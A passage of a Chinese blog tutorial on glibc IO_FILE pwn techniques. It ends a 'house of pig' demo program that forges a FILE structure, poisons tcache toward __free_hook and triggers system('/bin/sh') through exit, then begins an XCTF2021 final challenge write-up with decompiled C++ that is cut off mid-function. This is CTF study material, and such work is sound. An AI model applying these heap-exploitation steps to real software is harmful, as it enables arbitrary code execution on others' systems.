class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE[<span class="number">0x40</span> / <span class="number">8</span>] = chunk_1 + <span class="number">0x20</span> + <span class="number">0x46</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。最后注意free函数的参数是FILE结构体的起始地址，因此在第二个chunk+0x20处写入\&quot;/bin/sh\\x00\&quot;。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;另外在第二个chunk+0x30处写入system函数地址，memcpy函数能够将这里的地址复制到__free_hook。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)(chunk_1 + <span class="number">0x20</span>), <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(chunk_1 + <span class="number">0x20</span> + <span class="number">0x10</span>) = (<span class="type">size_t</span>)system;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第五步：通过tcache stashing unlink attack在tcache写入__free_hook附近地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;当赛题中只使用calloc时，只有在tcache中存放堆地址，才能让malloc分配到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面进行这种攻击的常规流程：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先分配9个chunk并释放，7个到tcache，2个到small bins。然后分配两个tcache chunk出来。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    chunks[<span class="number">7</span>] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    chunks[<span class="number">8</span>] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">9</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(chunks[i]);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;依次释放9个chunk，tcache中的chunk应该为：7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;unsorted bin中的chunk应该为：9&lt;-&gt;8。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后分配出来两个tcache chunk，再分配一个较大的chunk，让unsorted bin的两个chunk进入small bins。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;应该修改第9个chunk的bk指针为__free_hook附近地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span>*)((<span class="type">size_t</span>)(chunks[<span class="number">8</span>]) + <span class="number">0x8</span>) = __free_hook - <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;修改完成，之后分配一个出来进行攻击。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0xF0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;已经分配出来了一个chunk，现在0x100的tcache中的第一个chunk就是__free_hook附近的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第六步：调用exit函数触发house of pig漏洞。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;现在，所有的东西都已经布置好了，只需要一个exit函数，我们就能够执行预期的函数调用链并getshell。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="XCTF2021final-house-of-pig"><a href="#XCTF2021final-house-of-pig" class="headerlink" title="[XCTF2021final] house of pig"></a>[XCTF2021final] house of pig</h2><h4 id="检查信息-2"><a href="#检查信息-2" class="headerlink" title="检查信息"></a>检查信息</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028104920747.png"
                      alt="image-20231028104920747"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028104935630.png"
                      alt="image-20231028104935630"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028105055649.png"
                      alt="image-20231028105055649"
                ></p>
<p>没找到原 <code>libc</code>，这里使用如上 <code>libc</code> 。</p>
<h4 id="试运行-3"><a href="#试运行-3" class="headerlink" title="试运行"></a>试运行</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028105250592.png"
                      alt="image-20231028105250592"
                ></p>
<h4 id="逆向分析-4"><a href="#逆向分析-4" class="headerlink" title="逆向分析"></a>逆向分析</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> id; <span class="comment">// [rsp+0h] [rbp-420h]</span></span><br><span class="line">  <span class="type">int</span> new_id; <span class="comment">// [rsp+4h] [rbp-41Ch]</span></span><br><span class="line">  Info *info; <span class="comment">// [rsp+8h] [rbp-418h]</span></span><br><span class="line">  Info info1; <span class="comment">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class="line">  Info info2; <span class="comment">// [rsp+160h] [rbp-2C0h] BYREF</span></span><br><span class="line">  Info info3; <span class="comment">// [rsp+2B0h] [rbp-170h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+408h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">init_state</span>();</span><br><span class="line">  <span class="built_in">welcome</span>();</span><br><span class="line">  <span class="built_in">init_info1</span>(&amp;info1);</span><br><span class="line">  <span class="built_in">init_info2</span>(&amp;info2);</span><br><span class="line">  <span class="built_in">init_info3</span>(&amp;info3);</span><br><span class="line">  id = <span class="number">1</span>;</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Peppa Pig first~&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  info = &amp;info1;</span><br><span class="line">  <span class="built_in">get_info1</span>(&amp;info1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="built_in">get_num</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">add</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">show</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">edit</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">delete</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        new_id = <span class="built_in">login</span>();</span><br><span class="line">        <span class="keyword">if</span> ( new_id &amp;&amp; new_id != id )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> ( id )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              <span class="built_in">set_info1</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              <span class="built_in">set_info2</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              <span class="built_in">set_info3</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          id = new_id;</span><br><span class="line">          <span class="keyword">switch</span> ( new_id )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Peppa Pig~&quot;</span>);</span><br><span class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info1;</span><br><span class="line">              <span class="built_in">get_info1</span>(&amp;info1);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Mummy Pig~&quot;</span>);</span><br><span class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info2;</span><br><span class="line">              <span class="built_in">get_info2</span>(&amp;info2);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Daddy Pig~&quot;</span>);</span><br><span class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info3;</span><br><span class="line">              <span class="built_in">get_info3</span>(&amp;info3);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid...&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一道 <code>c++</code> 的 <code>pwn</code> 题。三只猪用户，一共五种操作，添加，查看，修改，删除，登录。最开始默认<code>peppa</code>（猪A）先操作，猪A的 <code>id=1</code> ，<code>Mummy</code> （猪B）的 <code>id=2</code>，<code>Daddy</code> （猪C）的 <code>id=3</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">add_1</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">add_2</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">add_3</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size1 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size1 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt;= state-&gt;min_size1 &amp;&amp; size &lt;= <span class="number">0x430</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size1 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size2 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size2 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt;= state-&gt;min_size2 &amp;&amp; size &lt;= <span class="number">0x450</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size2 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Mummy&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j + <span class="number">0x10</span>], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size3 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size3 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x8F</span> &amp;&amp; size &lt;= <span class="number">0x440</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size3 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Daddy&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j + <span class="number">0x20</span>], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span 